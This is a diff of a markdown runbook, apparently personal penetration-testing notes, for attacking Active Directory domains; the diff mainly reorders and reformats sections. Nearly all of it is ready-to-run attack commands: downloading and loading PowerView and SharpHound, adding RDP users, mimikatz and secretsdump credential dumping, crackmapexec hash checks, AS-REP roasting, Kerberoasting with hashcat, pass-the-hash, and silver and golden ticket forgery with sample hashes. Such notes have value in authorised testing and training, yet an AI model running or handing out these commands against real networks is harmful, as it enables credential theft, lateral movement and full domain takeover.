@@ -8,14 +8,14 @@
     - [Enumerating Users](#enumerating-users)
     - [Enumerating Groups](#enumerating-groups)
     - [Domain Information](#domain-information)
-    - [Configuring Modules](#configuring-modules)
-    - [ActiveDirectory Module - RSAT](#activedirectory-module---rsat)
     - [PowerView Module](#powerview-module)
     - [Last Logon](#last-logon)
     - [List Computers](#list-computers)
     - [Add Domain User to a Domain Group](#add-domain-user-to-a-domain-group)
     - [Enumeration Script for All AD Users](#enumeration-script-for-all-ad-users)
+    - [Access](#access)
     - [Enumeration Through Service Principal Names](#enumeration-through-service-principal-names)
+  - [Enumeration - BloodHound](#enumeration---bloodhound)
   - [Remote Access](#remote-access)
     - [Remote Desktop Protocol - RDP](#remote-desktop-protocol---rdp)
       - [RDP from terminal](#rdp-from-terminal)
@@ -29,12 +29,10 @@
     - [Extracting Hashes in Domain and Pivoting](#extracting-hashes-in-domain-and-pivoting)
     - [Extracting Hashes in cache](#extracting-hashes-in-cache)
     - [Extracting Hashes (Remote)](#extracting-hashes-remote)
+    - [AS-REP Roasting Attack - not require Pre-Authentication](#as-rep-roasting-attack---not-require-pre-authentication)
+    - [Kerberoast](#kerberoast)
   - [Service Account Attacks](#service-account-attacks)
   - [Password Spraying](#password-spraying)
-  - [Enumeration - BloodHound](#enumeration---bloodhound)
-  - [Access Validation](#access-validation)
-  - [AS-REP Roasting Attack - not require Pre-Authentication](#as-rep-roasting-attack---not-require-pre-authentication)
-  - [Kerberoast](#kerberoast)
   - [Active Directory Lateral Movement](#active-directory-lateral-movement)
     - [Pass the Hash](#pass-the-hash)
     - [Over Pass the Hash](#over-pass-the-hash)
@@ -47,6 +45,7 @@
 This runbook provides a comprehensive guide to Active Directory enumeration. It includes a variety of techniques and tools for discovering and exploiting Active Directory configurations.
 
 ## Enumeration
+
 ### Enumerating Users
   Enumerate all users in the entire domain
 ```sh
@@ -65,6 +64,7 @@ Get-NetLoggedon -ComputerName <computer_name>
 ```
 Get-NetSession -ComputerName dc1
 ```
+
 ### Enumerating Groups
   Enumerate all groups in the entire domain
 ```sh
@@ -74,38 +74,44 @@ net group /domain
 ```sh
 Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
 ```
+
 ### Domain Information
   Find out domain controller hostname
 ```sh
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
-### Configuring Modules
-### ActiveDirectory Module - RSAT
 
-```sh
-curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1
-curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll
-Import-Module .\Microsoft.ActiveDirectory.Management.dll
-Import-Module .\ActiveDirectory.psd1
-```
 ### PowerView Module
+
+ Configure ActiveDirectory Module - RSAT
+```
+curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
+curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
+Import-Module .\Microsoft.ActiveDirectory.Management.dll  
+Import-Module .\ActiveDirectory.psd1  
+```
+  Powerview
 ```sh
 curl https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1
 . .\PowerView.ps1
 ```
+
 ### Last Logon
 ```sh
 Get-LastLoggedOn -ComputerName <domain>
 ```
+
 ### List Computers
 ```sh
 Get-NetComputer (PowerView)
 ```
+
 ### Add Domain User to a Domain Group
 ```sh
 Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
 Get-NetGroupMember -GroupName 'SQLManagers'
 ```
+
 ### Enumeration Script for All AD Users
 ```powershell
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain::GetCurrentDomain()
@@ -129,11 +135,58 @@ Foreach($obj in $Result)
     Write-Host "------------------------"
 }
 ```
+
+### Access
+
+  Validation of network user credentials via smb using crackmmapexec  
+```
+crackmapexec smb <IP> -u <user> -H <hash> -d <domain> --continue-on-success
+crackmapexec smb <IP> -u <user> -H <hash> > -d <domain> 
+crackmapexec smb <IP> -u <user> -H <hash> -H <hash> --local-auth --lsa  
+crackmapexec smb <IP> -u <user> -p <password>
+```
+
+  Connect via smbclient
+```
+smbclient //ip -U <user> -L
+```
+  smbmap
+```
+smbmap -H <ip> -u <user> 
+```
+  Permission of given user on smb shares
+```
+crackmapexec smb <IP> --shares -u <user> -p '<pass>'
+```
+
 ### Enumeration Through Service Principal Names
 https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 
+## Enumeration - BloodHound
+-> Install - Attacker VM
+```
+# Note: Install 
+sudo apt install bloodhound
+```
+start neo4j - http://localhost:7474/
+```
+sudo neo4j start
+```
+ Enumeration - Windows
+``` powershell
+iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
+. .\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All,loggedon
+Invoke-BloodHound -CollectionMethod All -Verbose
+Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
+```
+
+
+
 ## Remote Access
+
 ### Remote Desktop Protocol - RDP
+
   Create a user  
 ```cmd
 net user <user> <password> /add
@@ -156,6 +209,7 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```cmd
 runas /user:<hostname>\<user> cmd
 ```
+
 #### RDP from terminal
   xfreerdp via RDP with sharing in \\\tsclient\share\
 ```
@@ -165,16 +219,19 @@ xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /driv
 ```
 rdesktop -u <user> -p <password> -d <domain> -f <ip>
 ```
+
 #### evil-winrm
 ```
 evil-winrm -i <ip> -u <user> -p <password>
 ```
 
 ## Exploitation
+
 ### Cached Credential Storage and Retrieval
 ```
 ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 ```
+
 ### Extracting hashes
 #### Intro
 SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
@@ -276,6 +333,40 @@ wdigest
 impacket-secretsdump <user>:<password>@<IP>
 ```
 
+### AS-REP Roasting Attack - not require Pre-Authentication
+  kerbrute - Enumeration Users
+```sh
+kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
+```
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+
+   GetNPUsers.py - Query ASReproastable accounts from the KDC
+```sh
+impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
+```
+
+### Kerberoast
+  impacket-GetUserSPNs
+```
+impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
+```
+or  
+```
+impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
+```
+```
+hashcat -a 0 -m 13100 <hash> /usr/share/wordlists/rockyou.txt 
+```
+```
+.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
+```
+or  
+```
+runas /user:<hostname>\<user> cmd.exe
+```
+
+
+
 ## Service Account Attacks
   Some user tickets that are stored in memory
   Display all cached Kerberos tickets for the current user
@@ -301,117 +392,36 @@ https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
 ```
 https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
 
-## Enumeration - BloodHound
--> Install - Attacker VM
-```
-# Note: Install 
-sudo apt install bloodhound
-```
-start neo4j - http://localhost:7474/
-```
-sudo neo4j start
-```
- Enumeration - Windows
-``` powershell
-iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
-. .\SharpHound.ps1
-Invoke-Bloodhound -CollectionMethod All,loggedon
-Invoke-BloodHound -CollectionMethod All -Verbose
-Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
-```
-## Access Validation 
-_______________________________________________________________________
--> Validation of network user credentials via smb using crackmmapexec  
-```
-crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
-crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> 
-crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa  
-crackmapexec smb 192.168.0.10-20 -u administrator -p <password>
-```
-
--> Connect via smbclient
-```
-smbclient //ip -U <user> -L
-```
-
--> smbmap
-```
-smbmap -H <ip> -u <user> 
-```
-
--> See read permission of given user on smb shares
-```
-crackmapexec smb <IP> --shares -u <user> -p '<pass>'
-```
-
-## AS-REP Roasting Attack - not require Pre-Authentication
--> kerbrute - Enumeration Users
-```
-kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
-```
-https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
-
--> GetNPUsers.py - Query ASReproastable accounts from the KDC
-```
-impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
-```
-
-## Kerberoast
--> impacket-GetUserSPNs
-```
-impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
-```
-or  
-```
-impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
-```
-
-```
-hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
-```
-```
-.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
-```
-or  
-```
-runas /user:<hostname>\<user> cmd.exe
-```
-
 
 ## Active Directory Lateral Movement
 ### Pass the Hash
--> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
-```
+  Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
+```sh
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
 ```
-
--> Remote Access - impacket-psexec  
-```
+  Remote Access - impacket-psexec  
+```sh
 impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
 impacket-psexec '<domain>/<user>'@<IP>
 ```
-
--> Remote Access + evil-winrm  
-```
+  Remote Access + evil-winrm  
+```sh
 evil-winrm -i <IP> -u <user> -H <hash>
 ```
 
 ### Over Pass the Hash
--> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
-
+Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+```cmd
+mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm.hash> /run:PowerShell.exe" "exit"
 ```
-mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
-```
-
--> Command execution with psexec  
-```
+   Command execution with psexec  
+``` cmd
 .\PsExec.exe \\<hostname> cmd.exe
 ```
 
 ### Silver Ticket - Pass the Ticket
--> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
-
--> Get SID
+It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
+  Get SID
 ```
 GetDomainsid (PowerView)
 ```
@@ -419,12 +429,12 @@ or
 ```
 whoami /user
 ```
--> Get Machine Account Hash
+  Get Machine Account Hash
 ```
 Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
-```
--> Exploitation mimikatz.exe
-```
+``` 
+ - Exploitation
+``` mimikatz
 kerberos::purge
 kerberos::list
 kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
@@ -436,13 +446,12 @@ kerberos::list
 ```
 
 ### Golden Ticket - Pass the Ticket
--> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
-
--> Get hash krbtgt
+It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
+  Get hash krbtgt
 ```
 ./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
 ```
--> Get SID
+  Get SID
 ```
 GetDomainsid (PowerView)
 ```
@@ -450,10 +459,11 @@ or
 ```
 whoami /user
 ```
-
--> Exploitation
-```
-mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
+- Exploitation
+``` mimikatz
+kerberos::purge
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+misc::cmd
 
 psexec.exe \\dc1 cmd.exe
 ```
